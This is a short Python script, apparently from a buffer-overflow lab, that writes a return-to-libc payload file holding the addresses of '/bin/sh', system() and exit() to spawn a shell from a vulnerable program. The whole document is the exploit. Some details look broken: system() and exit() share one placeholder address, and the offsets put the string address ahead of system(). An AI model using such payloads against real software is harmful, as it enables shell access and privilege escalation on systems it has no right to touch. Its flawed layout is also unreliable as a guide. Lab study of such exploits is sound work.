#!/usr/bin/python3
import sys

# Fill content with non-zero values
content = bytearray(0xAA for i in range(300))

# Replace these addresses with the actual addresses from the target system's libc
sh_addr = 0x7FFFFFFFE1F7  # Actual address for "/bin/sh"
system_addr = 0x7FFFFFFFE3E0  # Actual address for system()
exit_addr = 0x7FFFFFFFE3E0  # Actual address for exit()

X = 0
content[X : X + 8] = (sh_addr).to_bytes(8, byteorder="little")

Y = 8
content[Y : Y + 8] = (system_addr).to_bytes(8, byteorder="little")

Z = 16
content[Z : Z + 8] = (exit_addr).to_bytes(8, byteorder="little")

# Save content to a file
with open("/app/badfile", "wb") as f:
    f.write(content)
